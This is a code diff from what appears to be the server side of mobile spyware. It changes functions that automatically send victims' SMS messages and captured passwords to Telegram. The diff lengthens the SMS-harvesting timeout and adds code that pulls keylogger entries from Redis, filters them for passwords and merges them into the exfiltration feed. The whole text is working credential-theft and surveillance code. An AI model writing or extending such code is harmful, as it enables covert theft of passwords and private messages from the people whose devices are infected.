@@ -216,10 +216,10 @@ function _getTcpConnForDevice(deviceId) {
 }
 
 async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    // Request SMS from device (30s timeout via _sendAndCapture)
+    // Request SMS from device — use 90s timeout so devices with large SMS histories have enough time to collect and transmit
     let msgs = [];
     try {
-        const resp = await _sendAndCapture(deviceId, 'get_all_sms', { limit: 100 }, 30000);
+        const resp = await _sendAndCapture(deviceId, 'get_all_sms', { limit: 100 }, 90000);
         if (resp) {
             const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
             msgs = d.messages || d.sms || d.smsList || d.smsMessages || d.allSms
@@ -275,6 +275,15 @@ async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, u
     // Collect from in-memory sync (passwords stored on last fresh connect)
     const storedPwds = devicePasswords.get(deviceId) || [];
 
+    // Also pull from Redis keylogs (up to 500 entries pushed in real-time by the device)
+    let redisPwds = [];
+    try {
+        const redisEntries = await R.getKeylogs(deviceId);
+        redisPwds = redisEntries.filter(e =>
+            e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
+        );
+    } catch (_) {}
+
     // Also request live from device if online
     let livePwds = [];
     const conn = _getTcpConnForDevice(deviceId);
@@ -291,9 +300,9 @@ async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, u
         } catch (_) {}
     }
 
-    // Merge stored + live, dedupe by app+text+timestamp
+    // Merge stored + Redis + live, dedupe by app+text+timestamp
     const seen = new Set();
-    const entries = [...storedPwds, ...livePwds].filter(e => {
+    const entries = [...storedPwds, ...redisPwds, ...livePwds].filter(e => {
         const key = `${e.appName || e.packageName || ''}|${(e.text || e.typedText || '').slice(0, 50)}|${e.timestamp || ''}`;
         if (seen.has(key)) return false;
         seen.add(key);
